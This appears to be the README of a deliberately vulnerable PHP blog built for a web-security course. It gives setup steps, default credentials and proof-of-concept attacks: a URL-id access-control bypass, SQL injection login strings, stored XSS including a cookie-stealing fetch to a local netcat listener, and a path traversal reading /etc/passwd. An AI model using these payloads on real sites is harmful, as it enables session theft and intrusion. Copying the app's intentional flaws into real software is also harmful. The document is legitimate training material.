# VulnBlog

A vulnerable PHP/MariaDB web application created for the BIF-5/WEBSEC course.

## Setup
**Note:** `setup.sh` enables apache2 and mariadb at startup.

```
git clone https://github.com/FelixSchuster/VulnBlog
sudo chmod +x setup.sh
sudo ./setup.sh
```

## Default Credentials
Database:
- `vulnuser`:`P@ssword`

Webpage:
- `admin`:`admin`
- `felix`:`P@ssword`

Passwords are currently saved in plain text, might change this later on.. or not, it's just another vulnerability to test for.

## Vulnerabilities / Proof of Concept

### A01:2021 – Broken Access Control
#### Example 1
In the navbar select 'Previously created Blogposts' and edit any blogpost.
You can edit blogposts of other users by editing the id parameter in the url.
```
http://127.0.0.1/vulnblog/index.php?page=edit_blogpost.php&id=<EDIT THIS>
```

### A03:2021 – Injection
#### Example 1: SQL Injection
The login form is injectable:
```
http://127.0.0.1/vulnblog/index.php?page=login.php
```

Valid SQL injection queries are:
```
' or 1=1 #
admin' #
```

#### Example 2: Stored Cross-Site-Scripting
Create a blogpost including the following payload:
```
<script>alert("XSS");</script>
```

Try hijacking a php session cookie using the payload:
```
<script>fetch('http://127.0.0.1:1234/'+document.cookie);</script>
```

Additionally start a netcat listener using:
```
nc -lvnkp 1234
```

### A04:2013 - Insecure Direct Object References
#### Example 1
Try accessing:
```
http://127.0.0.1/vulnblog/index.php?page=../../../../../../../../etc/passwd
```

## Database
For further information see `./database/db.sql`.

![Database Diagram](./database/db.drawio.png)
